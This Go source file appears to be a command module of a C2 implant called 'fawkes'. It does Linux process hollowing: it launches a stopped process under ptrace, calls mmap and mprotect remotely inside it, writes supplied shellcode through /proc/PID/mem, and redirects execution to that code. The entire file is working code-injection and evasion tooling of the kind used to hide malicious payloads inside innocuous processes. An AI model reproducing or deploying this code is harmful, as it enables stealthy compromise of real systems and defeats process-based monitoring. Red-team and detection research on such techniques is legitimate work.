//go:build linux && amd64

package commands

import (
	"encoding/base64"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

type HollowingCommand struct{}

func (c *HollowingCommand) Name() string { return "hollow" }
func (c *HollowingCommand) Description() string {
	return "Process hollowing — create suspended process and inject shellcode via /proc/mem (T1055.012)"
}

type hollowParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	Target       string `json:"target"`
	Ppid         int    `json:"ppid"`
	BlockDLLs    bool   `json:"block_dlls"`
}

func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[hollowParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is required")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty")
	}

	if params.Target == "" {
		params.Target = "/usr/bin/sleep"
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	output, err := performHollowingLinux(shellcode, params)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Hollowing failed: %v", err))
	}

	return successResult(output)
}

func performHollowingLinux(shellcode []byte, params hollowParams) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Process Hollowing (Linux)\n")
	sb.WriteString(fmt.Sprintf("[*] Target: %s\n", params.Target))
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))

	// Step 1: Create suspended process via PTRACE_TRACEME
	parts := strings.Fields(params.Target)
	var args []string
	if len(parts) > 1 {
		args = parts[1:]
	} else {
		args = []string{"86400"}
	}

	cmd := exec.Command(parts[0], args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Ptrace: true,
	}

	if err := cmd.Start(); err != nil {
		return sb.String(), fmt.Errorf("CreateProcess failed: %w", err)
	}

	pid := cmd.Process.Pid
	sb.WriteString(fmt.Sprintf("[+] Created process PID: %d (stopped at exec)\n", pid))

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, syscall.WALL, nil); err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("wait for stop: %w", err)
	}

	if !ws.Stopped() {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("process exited unexpectedly (status: %v)", ws)
	}
	sb.WriteString(fmt.Sprintf("[+] Process stopped (signal: %v)\n", ws.StopSignal()))

	// Step 2: Get original registers
	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(pid, &origRegs); err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("PTRACE_GETREGS: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Original RIP: 0x%X\n", origRegs.Rip))

	// Step 3: Find syscall gadget in target
	syscallAddr, err := findSyscallGadget(pid)
	if err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("find syscall gadget: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Syscall gadget at 0x%X\n", syscallAddr))

	// Step 4: Allocate RW memory in target via mmap(9)
	pageSize := uint64(4096)
	scSize := uint64(len(shellcode))
	if scSize > pageSize {
		pageSize = ((scSize + 4095) / 4096) * 4096
	}

	allocAddr, err := execRemoteSyscall(pid, &origRegs, syscallAddr,
		9, 0, pageSize, 3, 0x22, 0xffffffffffffffff, 0)
	if err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("mmap failed: %w", err)
	}
	if allocAddr >= 0xfffffffffffff000 {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("mmap returned MAP_FAILED (0x%X)", allocAddr)
	}
	sb.WriteString(fmt.Sprintf("[+] mmap RW at 0x%X (%d bytes)\n", allocAddr, pageSize))

	// Step 5: Write shellcode via /proc/PID/mem
	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	n, err := writeProcMem(memPath, allocAddr, shellcode)
	if err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), err
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes via /proc/%d/mem\n", n, pid))

	// Step 6: mprotect(10) RW → RX
	mprotectRet, err := execRemoteSyscall(pid, &origRegs, syscallAddr,
		10, allocAddr, pageSize, 5, 0, 0, 0)
	if err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("mprotect failed: %w", err)
	}
	if mprotectRet != 0 {
		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d, continuing\n", int64(mprotectRet)))
	} else {
		sb.WriteString("[+] mprotect: RW → RX\n")
	}

	// Step 7: Redirect execution to shellcode
	newRegs := origRegs
	newRegs.Rip = allocAddr
	newRegs.Orig_rax = ^uint64(0)
	if err := syscall.PtraceSetRegs(pid, &newRegs); err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("PTRACE_SETREGS: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", allocAddr))

	// Step 8: Resume — detach and let shellcode run
	if err := syscall.PtraceDetach(pid); err != nil {
		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
	} else {
		sb.WriteString("[+] Detached from process\n")
	}

	sb.WriteString(fmt.Sprintf("[+] Process hollowing complete — PID %d running shellcode\n", pid))

	return sb.String(), nil
}
